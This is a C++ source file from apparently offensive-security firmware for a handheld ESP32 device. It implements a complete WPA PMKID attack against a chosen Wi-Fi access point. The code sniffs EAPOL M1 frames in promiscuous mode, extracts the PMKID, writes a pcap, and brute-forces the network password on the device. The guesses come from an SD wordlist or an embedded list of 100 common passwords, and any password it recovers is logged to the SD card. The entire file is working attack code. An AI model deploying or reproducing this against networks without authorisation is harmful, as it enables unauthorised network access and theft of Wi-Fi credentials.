// T-REX — offensive security firmware for LilyGo T-DECK
// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Abdallah Natsheh
//
// PMKID attack — capture PMKID from single EAPOL M1 frame (no client needed)
// Crack: PBKDF2(SSID, pwd) → HMAC-SHA1-128(PMK, "PMK Name"||AP||STA) == captured PMKID

#include "pmkid_attack.h"
#include "input_handling.h"
#include "sdcard_manager.h"
#include "lockscreen_manager.h"
#include "clock_manager.h"
#include <SD.h>

extern InputHandling inputHandler;
extern SDCardManager sdCardManager;

// ── Built-in top-100 common WPA passwords ────────────────────────────────────
static const char* const kBuiltinPwds[] = {
    "password",    "123456789",   "12345678",    "1q2w3e4r",    "sunshine",
    "football",    "1234567890",  "computer",    "superman",    "internet",
    "iloveyou",    "1qaz2wsx",    "baseball",    "whatever",    "princess",
    "abcd1234",    "starwars",    "trustno1",    "password1",   "jennifer",
    "michelle",    "mercedes",    "benjamin",    "11111111",    "samantha",
    "victoria",    "alexander",   "987654321",   "asdf1234",    "1234qwer",
    "qwertyuiop",  "q1w2e3r4",    "elephant",    "garfield",    "chocolate",
    "jonathan",    "caroline",    "maverick",    "midnight",    "88888888",
    "creative",    "qwerty123",   "cocacola",    "passw0rd",    "liverpool",
    "blink182",    "asdfghjkl",   "danielle",    "scorpion",    "veronica",
    "nicholas",    "asdfasdf",    "metallica",   "december",    "patricia",
    "christian",   "spiderman",   "security",    "slipknot",    "november",
    "jordan23",    "qwertyui",    "butterfly",   "swordfish",   "carolina",
    "hardcore",    "corvette",    "12341234",    "remember",    "qwer1234",
    "leonardo",    "snickers",    "williams",    "angelina",    "anderson",
    "123123123",   "pakistan",    "marlboro",    "kimberly",    "00000000",
    "snowball",    "sebastian",   "godzilla",    "hello123",    "champion",
    "precious",    "einstein",    "napoleon",    "mountain",    "dolphins",
    "charlotte",   "fernando",    "basketball",  "barcelona",   "87654321",
    "paradise",    "motorola",    "brooklyn",    "stephanie",   "elizabeth",
    "0123456789",
};
static constexpr int kBuiltinPwdCount = sizeof(kBuiltinPwds) / sizeof(kBuiltinPwds[0]);

// ── PMKID state ───────────────────────────────────────────────────────────────
struct PmkidData {
    uint8_t  apMac[6];
    uint8_t  clientMac[6];
    uint8_t  pmkid[16];
    char     ssid[33];
    bool     hasPmkid;
    // Raw M1 frame buffered in RAM — written to pcap after WiFi teardown (GDMA rule)
    uint8_t  m1Raw[256];
    uint16_t m1RawLen;
    uint32_t m1Ts;
};
static PmkidData g_pm;

// ── Ring buffer (ISR → main loop) ─────────────────────────────────────────────
#define PM_RING_SIZE 8
#define PM_FRAME_MAX 256

struct PmFrame {
    uint8_t  data[PM_FRAME_MAX];
    uint16_t len;
    uint32_t ts_ms;
};
static volatile PmFrame pmRing[PM_RING_SIZE];
static volatile uint8_t pmHead      = 0;
static volatile uint8_t pmTail      = 0;
static volatile uint8_t g_pmBssid[6];
static volatile bool    g_pmCapture = false;

// ── PMKID extraction from EAPOL M1 Key Data ──────────────────────────────────
// PMKID KDE format inside Key Data: DD 14 00:0F:AC 04 <16 bytes PMKID>
// Offsets within eapol[] (from start of EAPOL header):
//   [97-98] key data length (big-endian)
//   [99+]   key data (plain in M1 — no encryption before PTK)
static bool extractPmkid(const uint8_t* eapol, int eapolAvail, uint8_t* out) {
    if (eapolAvail < 101) return false;
    uint16_t kdLen = ((uint16_t)eapol[97] << 8) | eapol[98];
    // clamp to actual available bytes
    if ((int)(99 + kdLen) > eapolAvail) kdLen = (uint16_t)(eapolAvail - 99);
    if (kdLen < 22) return false;

    const uint8_t* kd = eapol + 99;
    int remaining = (int)kdLen;

    while (remaining >= 22) {
        // KDE: type(1) + len(1) + data(len)
        // PMKID KDE: DD 14 00:0F:AC 04 + 16B PMKID  (total 22 bytes)
        if (kd[0] == 0xDD && kd[1] >= 20 &&
            kd[2] == 0x00 && kd[3] == 0x0F && kd[4] == 0xAC && kd[5] == 0x04) {
            memcpy(out, kd + 6, 16);
            return true;
        }
        if (kd[1] < 1) break;  // malformed KDE
        int step = (int)kd[1] + 2;
        if (step > remaining) break;
        kd += step;
        remaining -= step;
    }
    return false;
}

// ── ISR callback — filter DATA frames, capture M1 only ───────────────────────
static void IRAM_ATTR rxCallback(void* buf, wifi_promiscuous_pkt_type_t pktType) {
    if (!g_pmCapture) return;
    if (pktType != WIFI_PKT_DATA) return;

    const wifi_promiscuous_pkt_t* ppkt = (const wifi_promiscuous_pkt_t*)buf;
    const uint8_t* d   = ppkt->payload;
    uint16_t       len = ppkt->rx_ctrl.sig_len;
    if (len < 40) return;

    uint8_t frameType = (d[0] >> 2) & 0x03;
    if (frameType != 2) return;  // DATA only

    uint8_t tods   = d[1] & 0x01;
    uint8_t fromds = (d[1] >> 1) & 0x01;
    if (tods && fromds) return;  // skip WDS 4-addr

    int hdrLen = ((d[0] >> 4) & 0x08) ? 26 : 24;  // QoS adds 2B
    if (len < (uint16_t)(hdrLen + 12)) return;

    // BSSID: ToDS=1 → addr1 (d+4); FromDS=1 → addr2 (d+10)
    const uint8_t* frameBssid = tods ? (d + 4) : (d + 10);
    if (memcmp(frameBssid, (const void*)g_pmBssid, 6) != 0) return;

    // LLC/SNAP EAPOL: AA AA 03 00 00 00 88 8E
    const uint8_t* llc = d + hdrLen;
    if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03) return;
    if (llc[6] != 0x88 || llc[7] != 0x8E) return;

    const uint8_t* eapol = d + hdrLen + 8;
    int eapolAvail = len - hdrLen - 8;
    if (eapolAvail < 8) return;

    if (eapol[1] != 0x03) return;                        // must be EAPOL-Key
    if (eapol[4] != 0x02 && eapol[4] != 0x01) return;   // RSN or WPA

    // M1: ACK set (kiLo bit7), MIC not set (kiHi bit0)
    bool ack = (eapol[6] & 0x80) != 0;
    bool mic = (eapol[5] & 0x01) != 0;
    if (!ack || mic) return;

    uint8_t next = (pmHead + 1) % PM_RING_SIZE;
    if (next == pmTail) return;  // ring full — drop

    PmFrame& slot = (PmFrame&)pmRing[pmHead];
    slot.len   = len < PM_FRAME_MAX ? len : PM_FRAME_MAX;
    memcpy(slot.data, d, slot.len);
    slot.ts_ms = millis();
    pmHead = next;
}

// ── Constructor ───────────────────────────────────────────────────────────────
PmkidAttack::PmkidAttack(DisplayManager& dm, WiFiFunctions& wf, DeauthAttack& da)
    : _dm(dm), _wf(wf), _da(da) {}

// ── Helpers ───────────────────────────────────────────────────────────────────
bool PmkidAttack::parseMac(const char* str, uint8_t* mac) {
    if (!str || strlen(str) < 17) return false;
    return sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                  &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]) == 6;
}

String PmkidAttack::macStr(const uint8_t* m) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             m[0], m[1], m[2], m[3], m[4], m[5]);
    return String(buf);
}

// ── Argument parsing ──────────────────────────────────────────────────────────
void PmkidAttack::start(char* args) {
    if (!args || !*args) {
        _dm.println("Usage:");
        _dm.println("  pm <index>");
        _dm.println("  pm <bssid> [ch]");
        _dm.printCommandScreen();
        return;
    }

    char buf[128];
    strncpy(buf, args, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';

    char* first  = strtok(buf, " ");
    char* second = strtok(nullptr, " ");

    uint8_t bssid[6];
    int     channel = 6;
    char    ssid[33] = {0};

    if (!strchr(first, ':')) {
        int idx = atoi(first);
        if (!_wf.isScanDone()) {
            _dm.println("Run scanwifi first.");
            _dm.printCommandScreen();
            return;
        }
        if (!_wf.getNetworkInfo(idx, bssid, &channel)) {
            _dm.printText("Invalid index. Max: ");
            _dm.println(_wf.getNetworkCount() - 1);
            _dm.printCommandScreen();
            return;
        }
        _wf.getNetworkSSID(idx, ssid);
    } else {
        if (!parseMac(first, bssid)) {
            _dm.println("Bad BSSID. Format: XX:XX:XX:XX:XX:XX");
            _dm.printCommandScreen();
            return;
        }
        if (second) {
            int ch = atoi(second);
            if (ch >= 1 && ch <= 13) channel = ch;
        }
    }

    run(bssid, channel, ssid);
}

// ── PMKID crack: PBKDF2 → HMAC-SHA1-128(PMK, "PMK Name"||AP||STA) ────────────
// Simpler than WPA MIC: no PRF-512, just one HMAC-SHA1, take first 16 bytes
bool PmkidAttack::tryPassword(const char* pwd,
                               mbedtls_md_context_t* ctx,
                               const mbedtls_md_info_t* sha1) {
    uint8_t pmk[32];
    mbedtls_pkcs5_pbkdf2_hmac(ctx,
        (const uint8_t*)pwd,       strlen(pwd),
        (const uint8_t*)g_pm.ssid, strlen(g_pm.ssid),
        4096, 32, pmk);

    // "PMK Name" (8B) || AP_MAC (6B) || STA_MAC (6B) = 20 bytes
    uint8_t data[20];
    memcpy(data,      "PMK Name",       8);
    memcpy(data + 8,  g_pm.apMac,       6);
    memcpy(data + 14, g_pm.clientMac,   6);

    uint8_t hmac[20];
    mbedtls_md_hmac(sha1, pmk, 32, data, 20, hmac);

    return memcmp(hmac, g_pm.pmkid, 16) == 0;  // HMAC-SHA1-128 = first 16 bytes
}

// ── Crack UI ──────────────────────────────────────────────────────────────────
void PmkidAttack::crack() {
    if (!g_pm.hasPmkid) {
        _dm.setTextColor(TFT_RED); _dm.println("No PMKID captured.");
        _dm.setTextColor(TFT_WHITE);
        vTaskDelay(pdMS_TO_TICKS(1500));
        return;
    }
    if (g_pm.ssid[0] == '\0') {
        _dm.setTextColor(TFT_RED); _dm.println("SSID unknown — use index mode.");
        _dm.setTextColor(TFT_WHITE);
        vTaskDelay(pdMS_TO_TICKS(1500));
        return;
    }

    _dm.clearScreen();
    _dm.setCursor(10, outputY);
    _dm.setTextColor(0x7BEF);    _dm.printText("[");
    _dm.setTextColor(TFT_CYAN);  _dm.printText("PMKID");
    _dm.setTextColor(0x7BEF);    _dm.printText("::");
    _dm.setTextColor(TFT_YELLOW);_dm.println("CRACK]");
    _dm.printSeparator();
    _dm.setCursor(10, _dm.getCursorY());
    _dm.setTextColor(0x7BEF); _dm.printText("SSID  "); _dm.setTextColor(TFT_WHITE); _dm.println(g_pm.ssid);
    _dm.setCursor(10, _dm.getCursorY());
    _dm.setTextColor(0x7BEF); _dm.printText("AP    "); _dm.setTextColor(TFT_WHITE); _dm.println(macStr(g_pm.apMac).c_str());
    _dm.printSeparator();

    bool hasWl = sdCardManager.isReady() && SD.exists(SD_CFG_WORDLIST_PM);
    bool useSD = hasWl;
    if (hasWl) {
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(TFT_GREEN); _dm.println("[1] /apps/pmkid/wordlist.txt (SD)");
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(0x7BEF);   _dm.println("[2] Built-in (100 pwds)");
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(TFT_WHITE); _dm.println("Choose source:");
        char ch = 0;
        while (ch != '1' && ch != '2') ch = inputHandler.getKeyboardInput();
        useSD = (ch == '1');
        _dm.clearScreen();
        _dm.setCursor(10, outputY);
        _dm.setTextColor(0x7BEF);    _dm.printText("[");
        _dm.setTextColor(TFT_CYAN);  _dm.printText("PMKID");
        _dm.setTextColor(0x7BEF);    _dm.printText("::");
        _dm.setTextColor(TFT_YELLOW);_dm.println("CRACK]");
        _dm.printSeparator();
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(0x7BEF); _dm.printText("SSID  "); _dm.setTextColor(TFT_WHITE); _dm.println(g_pm.ssid);
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(0x7BEF); _dm.printText("AP    "); _dm.setTextColor(TFT_WHITE); _dm.println(macStr(g_pm.apMac).c_str());
        _dm.printSeparator();
    }

    int32_t tryY = _dm.getCursorY();

    mbedtls_md_context_t mdCtx;
    mbedtls_md_init(&mdCtx);
    const mbedtls_md_info_t* sha1 = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
    mbedtls_md_setup(&mdCtx, sha1, 1);  // 1 = HMAC mode

    uint32_t tried = 0, skipped = 0;
    uint32_t t0 = millis(), lastRedraw = 0;
    char found[64] = {0};
    bool done = false;

    auto redraw = [&](const char* current) {
        _dm.fillRect(10, tryY, 310, LINE_HEIGHT * 3 + 2, TFT_BLACK);
        _dm.setCursor(10, tryY);
        _dm.setTextColor(0x7BEF); _dm.printText("Trying  ");
        _dm.setTextColor(TFT_WHITE);
        char trunc[22]; strncpy(trunc, current, 21); trunc[21] = '\0';
        _dm.println(trunc);
        uint32_t elapsed = (millis() - t0) / 1000;
        uint32_t rate = elapsed ? tried / elapsed : tried * 2;
        _dm.setCursor(10, _dm.getCursorY());
        char stat[40];
        snprintf(stat, sizeof(stat), "%-5u tried  %-4u skip  %u/s", tried, skipped, rate);
        _dm.setTextColor(0x4208); _dm.println(stat);
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(useSD ? TFT_CYAN : TFT_YELLOW);
        _dm.println(useSD ? "Source: /apps/pmkid/wordlist.txt" : "Source: built-in (100)");
        _dm.setTextColor(TFT_WHITE);
    };

    if (useSD) {
        File wl = SD.open(SD_CFG_WORDLIST_PM, FILE_READ);
        if (wl) {
            char line[64];
            while (wl.available() && !done) {
                int i = 0;
                while (wl.available() && i < 63) {
                    char c = (char)wl.read();
                    if (c == '\r') { if (wl.available() && wl.peek() == '\n') wl.read(); break; }
                    if (c == '\n') break;
                    line[i++] = c;
                }
                line[i] = '\0';
                if (i < 8 || i > 63) { skipped++; continue; }
                tried++;
                uint32_t now = millis();
                if (now - lastRedraw >= 300) {
                    lastRedraw = now;
                    redraw(line);
                    char k = inputHandler.getKeyboardInput();
                    if (k == 'q' || k == 'Q') { done = true; break; }
                    vTaskDelay(1);
                }
                if (tryPassword(line, &mdCtx, sha1)) {
                    strncpy(found, line, sizeof(found) - 1);
                    done = true;
                }
            }
            wl.close();
        } else { useSD = false; }
    }

    if (!done) {
        useSD = false;
        for (int i = 0; i < kBuiltinPwdCount && !done; i++) {
            tried++;
            uint32_t now = millis();
            if (now - lastRedraw >= 300) {
                lastRedraw = now;
                redraw(kBuiltinPwds[i]);
                char k = inputHandler.getKeyboardInput();
                if (k == 'q' || k == 'Q') break;
                vTaskDelay(1);
            }
            if (tryPassword(kBuiltinPwds[i], &mdCtx, sha1)) {
                strncpy(found, kBuiltinPwds[i], sizeof(found) - 1);
                done = true;
            }
        }
    }

    mbedtls_md_free(&mdCtx);

    _dm.fillRect(10, tryY, 310, LINE_HEIGHT * 3 + 2, TFT_BLACK);
    _dm.setCursor(10, tryY);

    if (found[0]) {
        _dm.setTextColor(TFT_GREEN); _dm.printText("[CRACKED] ");
        _dm.setTextColor(TFT_WHITE); _dm.println(found);
        if (sdCardManager.isReady()) {
            sdCardManager.ensureDir(SD_DIR_PMKID);
            char ts[22] = "";
            ClockManager::instance().getTimestamp(ts, sizeof(ts));
            char logLine[152];
            if (ts[0])
                snprintf(logLine, sizeof(logLine), "%s,%s,%s,%s,PMKID",
                         ts, macStr(g_pm.apMac).c_str(), g_pm.ssid, found);
            else
                snprintf(logLine, sizeof(logLine), "%s,%s,%s,PMKID",
                         macStr(g_pm.apMac).c_str(), g_pm.ssid, found);
            sdCardManager.appendLine(SD_LOG_CRACKED_PM, logLine);
        }
    } else {
        _dm.setTextColor(TFT_RED); _dm.println("No match.");
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(0x4208); _dm.println("Use hashcat --hash-type 22000 offline.");
    }

    uint32_t elapsed = (millis() - t0) / 1000;
    uint32_t rate    = elapsed ? tried / elapsed : tried * 2;
    _dm.setCursor(10, _dm.getCursorY());
    char stat[48];
    snprintf(stat, sizeof(stat), "%u tried, %u skip  %us (%u/s)", tried, skipped, elapsed, rate);
    _dm.setTextColor(0x4208); _dm.println(stat);
    _dm.setTextColor(TFT_WHITE);
    _dm.setCursor(10, _dm.getCursorY());
    _dm.println("[q] back");
    while (true) {
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;
        vTaskDelay(pdMS_TO_TICKS(50));
    }
}

// ── Core capture loop ─────────────────────────────────────────────────────────
void PmkidAttack::run(const uint8_t* bssid, int channel, const char* ssid) {
    pmHead = pmTail = 0;
    memcpy((void*)g_pmBssid, bssid, 6);
    g_pmCapture = false;
    memset(&g_pm, 0, sizeof(g_pm));
    memcpy(g_pm.apMac, bssid, 6);
    strncpy(g_pm.ssid, ssid, 32);

    // Open pcap BEFORE WiFi mode change — GDMA rule
    bool fileOk = false;
    File pcap;
    if (sdCardManager.isReady()) {
        sdCardManager.ensureDir(SD_DIR_PMKID);
        char fname[48];
        snprintf(fname, sizeof(fname), SD_DIR_PMKID "/%02X-%02X-%02X-%02X-%02X-%02X.cap",
                 bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
        pcap = SD.open(fname, FILE_WRITE);
        fileOk = (bool)pcap;
        if (fileOk) {
            struct __attribute__((packed)) {
                uint32_t magic    = 0xa1b2c3d4;
                uint16_t vmaj     = 2;
                uint16_t vmin     = 4;
                int32_t  tz       = 0;
                uint32_t sig      = 0;
                uint32_t snap     = 65535;
                uint32_t linktype = 105;  // LINKTYPE_IEEE802_11
            } ghdr;
            pcap.write((uint8_t*)&ghdr, sizeof(ghdr));
        }
    }

    // WiFi: APSTA (needed for deauth injection to trigger re-association)
    WiFi.mode(WIFI_MODE_APSTA);
    WiFi.softAP("x", nullptr, channel, 1, 0, false);
    vTaskDelay(pdMS_TO_TICKS(100));

    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(rxCallback);
    esp_wifi_set_channel((uint8_t)channel, WIFI_SECOND_CHAN_NONE);
    vTaskDelay(pdMS_TO_TICKS(50));
    g_pmCapture = true;

    // statusY is set inside fullRedraw() after separator — captured by ref in lambdas
    int32_t statusY = outputY + LINE_HEIGHT * 5;  // placeholder, overwritten by fullRedraw()

    uint32_t m1Count    = 0;
    uint32_t lastRefresh = 0;

    auto redrawStatus = [&]() {
        _dm.fillRect(10, statusY, 310, LINE_HEIGHT * 4 + 2, TFT_BLACK);
        _dm.setCursor(10, statusY);

        if (g_pm.hasPmkid) {
            _dm.setTextColor(TFT_GREEN); _dm.println("[PMKID CAPTURED!]");
            _dm.setCursor(10, _dm.getCursorY());
            // Show first 8 bytes of PMKID as hex preview
            char hex[17];
            for (int i = 0; i < 8; i++) snprintf(hex + i * 2, 3, "%02X", g_pm.pmkid[i]);
            hex[16] = '\0';
            _dm.setTextColor(0x4208); _dm.println(hex);
            _dm.setCursor(10, _dm.getCursorY());
            _dm.setTextColor(TFT_CYAN); _dm.println("[c] crack   [q] stop");
        } else {
            char line[32];
            snprintf(line, sizeof(line), "M1 frames seen: %u", m1Count);
            _dm.setTextColor(0x7BEF); _dm.println(line);
            _dm.setCursor(10, _dm.getCursorY());
            _dm.setTextColor(0x4208);
            _dm.println(m1Count ? "M1 seen — no PMKID in Key Data" : "Waiting for EAPOL M1...");
            _dm.setCursor(10, _dm.getCursorY());
            _dm.setTextColor(0x4208); _dm.println("[q] stop");
        }
        _dm.setTextColor(TFT_WHITE);
    };

    // Full UI redraw — called on first draw and after unlock
    auto fullRedraw = [&]() {
        _dm.clearScreen();
        _dm.setCursor(10, outputY);
        _dm.setTextColor(0x7BEF);    _dm.printText("[");
        _dm.setTextColor(TFT_CYAN);  _dm.printText("PMKID");
        _dm.setTextColor(0x7BEF);    _dm.printText("::");
        _dm.setTextColor(TFT_YELLOW);_dm.println("CAPTURE]");
        _dm.printSeparator();
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(0x7BEF); _dm.printText("AP  "); _dm.setTextColor(TFT_WHITE); _dm.println(macStr(bssid).c_str());
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(0x7BEF); _dm.printText("CH  "); _dm.setTextColor(TFT_WHITE); _dm.println(channel);
        _dm.setCursor(10, _dm.getCursorY());
        _dm.setTextColor(0x7BEF); _dm.printText("SD  ");
        if (fileOk) {
            char shortName[22];
            snprintf(shortName, sizeof(shortName), "%02X-%02X-%02X...cap", bssid[0], bssid[1], bssid[2]);
            _dm.setTextColor(TFT_GREEN); _dm.println(shortName);
        } else {
            _dm.setTextColor(TFT_RED); _dm.println("none — RAM only");
        }
        _dm.printSeparator();
        statusY = _dm.getCursorY();  // capture correct Y after separator
        redrawStatus();
    };

    fullRedraw();

    // Write M1 frame to pcap after WiFi teardown (GDMA rule — no SD during WiFi)
    auto finalizePcap = [&]() {
        if (!fileOk || g_pm.m1RawLen == 0) { if (fileOk) { pcap.flush(); pcap.close(); } return; }
        struct __attribute__((packed)) {
            uint32_t ts_sec; uint32_t ts_usec; uint32_t incl_len; uint32_t orig_len;
        } rh;
        rh.ts_sec   = g_pm.m1Ts / 1000;
        rh.ts_usec  = (g_pm.m1Ts % 1000) * 1000;
        rh.incl_len = rh.orig_len = g_pm.m1RawLen;
        pcap.write((uint8_t*)&rh, sizeof(rh));
        pcap.write(g_pm.m1Raw, g_pm.m1RawLen);
        pcap.flush();
        pcap.close();
    };

    // Main loop
    while (true) {
        char k = inputHandler.getKeyboardInput();
        if (k == 'q' || k == 'Q') break;

        // Restore full UI after unlock
        if (LockScreenManager::getInstance().consumeJustUnlocked()) {
            fullRedraw();
        }

        if ((k == 'c' || k == 'C') && g_pm.hasPmkid) {
            g_pmCapture = false;
            esp_wifi_set_promiscuous_rx_cb(nullptr);
            esp_wifi_set_promiscuous(false);
            WiFi.softAPdisconnect(true);
            WiFi.mode(WIFI_STA);
            finalizePcap();
            crack();
            _dm.printCommandScreen();
            return;
        }

        // Drain ring — extract PMKID from M1 frames
        while (pmTail != pmHead) {
            PmFrame frame;
            memcpy(&frame, (const void*)&pmRing[pmTail], sizeof(PmFrame));
            pmTail = (pmTail + 1) % PM_RING_SIZE;

            uint8_t subtype = (frame.data[0] >> 4) & 0x0F;
            int hdrLen = (subtype & 0x08) ? 26 : 24;
            if (frame.len < (uint16_t)(hdrLen + 8)) continue;

            const uint8_t* eapol = frame.data + hdrLen + 8;
            int eapolAvail = frame.len - hdrLen - 8;

            m1Count++;

            // Save first M1 raw for pcap; extract client MAC
            // M1 direction: AP→STA (FromDS=1,ToDS=0) → addr1(d+4) = client MAC (DA)
            if (g_pm.m1RawLen == 0) {
                uint16_t copyLen = frame.len < 256 ? frame.len : 256;
                memcpy(g_pm.m1Raw, frame.data, copyLen);
                g_pm.m1RawLen = copyLen;
                g_pm.m1Ts     = frame.ts_ms;
                memcpy(g_pm.clientMac, frame.data + 4, 6);  // addr1 = DA = client
            }

            // Try to extract PMKID from Key Data KDE
            if (!g_pm.hasPmkid) {
                uint8_t pmkidBuf[16];
                if (extractPmkid(eapol, eapolAvail, pmkidBuf)) {
                    memcpy(g_pm.pmkid, pmkidBuf, 16);
                    g_pm.hasPmkid = true;
                }
            }
        }

        uint32_t now = millis();
        if (now - lastRefresh >= 300) {
            lastRefresh = now;
            redrawStatus();
        }
    }

    // Teardown
    g_pmCapture = false;
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_set_promiscuous(false);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    finalizePcap();
    _dm.printCommandScreen();
}
